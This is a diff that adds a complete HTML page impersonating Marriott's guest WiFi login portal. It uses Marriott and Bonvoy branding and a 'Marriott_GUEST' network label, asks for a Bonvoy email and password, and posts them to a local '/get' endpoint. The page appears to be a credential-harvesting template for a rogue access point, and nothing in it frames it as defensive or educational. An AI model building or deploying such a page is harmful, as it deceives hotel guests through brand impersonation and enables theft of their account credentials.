@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#8B0000;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.mlogo{text-align:center;margin-bottom:20px}
+.mlogo h1{font-size:28px;font-weight:300;color:#fff;letter-spacing:4px;text-transform:uppercase}
+.mlogo p{font-size:11px;color:rgba(255,255,255,0.65);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
+.card{background:#fff;width:100%;max-width:420px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.3)}
+.ch{background:#1a1a1a;padding:22px 24px;text-align:center;border-bottom:3px solid #8B0000}
+.ch h1{font-size:16px;font-weight:600;color:#fff;letter-spacing:1px}.ch p{font-size:12px;color:#aaa;margin-top:3px}
+.cb{padding:26px 24px 22px}
+.badge{display:flex;align-items:center;gap:10px;background:#fff5f5;border:1px solid #f0c0c0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
+.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
+.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
+.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
+input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:9px;font-size:15px;background:#fafafa;color:#1a1a1a}
+input:focus{outline:none;border-color:#8B0000;box-shadow:0 0 0 3px rgba(139,0,0,0.1)}
+input::placeholder{color:#c0c0c0}
+.forgot{display:block;text-align:right;font-size:12px;color:#8B0000;text-decoration:none;margin-top:8px}
+.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#8B0000}
+.btn{width:100%;padding:13px;border:none;border-radius:9px;background:#8B0000;color:#fff;font-size:14px;font-weight:700;letter-spacing:0.5px;cursor:pointer;margin-top:14px}
+.foot{background:#f9f7f5;border-top:1px solid #eee;padding:12px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:11px;color:#aaa}.foot a{color:#8B0000;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="mlogo"><h1>MARRIOTT</h1><p>Bonvoy Member Access</p></div>
+<div class="card">
+  <div class="ch"><h1>Marriott Guest Internet</h1><p>Premium WiFi for Bonvoy members</p></div>
+  <div class="cb">
+    <div class="badge"><div class="dot"></div><span>Network: <strong>Marriott_GUEST</strong></span></div>
+    <form action="/get">
+      <label class="lbl">Marriott Bonvoy Email</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <a href="#" class="forgot">Forgot password?</a>
+      <p class="terms">By connecting you agree to <a href="#">Marriott's Internet Terms</a>.</p>
+      <button type="submit" class="btn">Connect to Internet</button>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Marriott International</span><a href="#">Help Desk</a></div>
+</div>
+</body>
+</html>
